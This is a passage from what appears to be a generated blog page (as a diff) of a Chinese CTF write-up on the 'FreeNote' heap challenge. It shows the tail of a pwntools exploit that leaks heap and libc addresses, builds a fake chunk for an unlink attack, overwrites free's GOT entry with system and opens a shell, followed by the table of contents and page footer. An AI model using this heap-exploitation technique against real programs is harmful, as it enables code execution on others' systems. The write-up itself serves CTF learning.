class="line">p.recvuntil(&quot;choice: &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;0. &#x2F;bin&#x2F;sh\n&quot;)</span><br><span class="line">heap_addr&#x3D;u64(p.recvuntil(&quot;\n&quot;).strip().ljust(8,&quot;\x00&quot;))-0x1940</span><br><span class="line">p.recvuntil(&quot;2. aaaaaaa\n&quot;)</span><br><span class="line">libc.address&#x3D;u64(p.recv(6).ljust(8,&quot;\x00&quot;))-0x3c4b78</span><br><span class="line">delete(3)</span><br><span class="line">delete(2)</span><br><span class="line">fake_chunk&#x3D;p64(0)+p64(0x81)+p64(heap_addr+0x60-0x18)+p64(heap_addr+0x60-0x10)+&#39;a&#39;*0x60+p64(0x80)+p64(0x90)+&#39;a&#39;*0x80+p64(0)+p64(0x91)+&#39;a&#39;*0x80+p64(0)+p64(0x91)+&#39;a&#39;*0x80</span><br><span class="line">new(len(fake_chunk),fake_chunk)</span><br><span class="line">delete(3)</span><br><span class="line">edit(2,0x230,p64(elf.got[&#39;free&#39;])+p64(0)*0x228)</span><br><span class="line">edit(1,0x8,p64(libc.symbols[&#39;system&#39;]))</span><br><span class="line">delete(0)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-程序分析"><span class="toc-number">1.</span> <span class="toc-text">0x01 程序分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#new"><span class="toc-number">1.0.1.</span> <span class="toc-text">new</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete"><span class="toc-number">1.1.</span> <span class="toc-text">delete</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edit"><span class="toc-number">1.2.</span> <span class="toc-text">edit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-漏洞"><span class="toc-number">2.</span> <span class="toc-text">0x02 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#leak-libc"><span class="toc-number">2.1.</span> <span class="toc-text">leak libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#leak-heap"><span class="toc-number">2.2.</span> <span class="toc-text">leak heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Double-free-amp-amp-unlink"><span class="toc-number">2.3.</span> <span class="toc-text">Double free &amp;&amp; unlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#system-“-bin-sh”"><span class="toc-number">2.4.</span> <span class="toc-text">system(“&#x2F;bin&#x2F;sh”)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-EXP"><span class="toc-number">3.</span> <span class="toc-text">0x03 EXP</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/09/21/unlink-FreeNote/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/09/21/unlink-FreeNote/&text=unlink-FreeNote" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/09/21/unlink-FreeNote/&title=unlink-FreeNote" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/09/21/unlink-FreeNote/&is_video=false&description=unlink-FreeNote" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=unlink-FreeNote&body=Check out this article: http://yoursite.com/2018/09/21/unlink-FreeNote/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/09/21/unlink-FreeNote/&title=unlink-FreeNote" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/09/21/unlink-FreeNote/&title=unlink-FreeNote" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/09/21/unlink-FreeNote/&title=unlink-FreeNote" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/09/21/unlink-FreeNote/&title=unlink-FreeNote" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/09/21/unlink-FreeNote/&name=unlink-FreeNote&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Kirin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
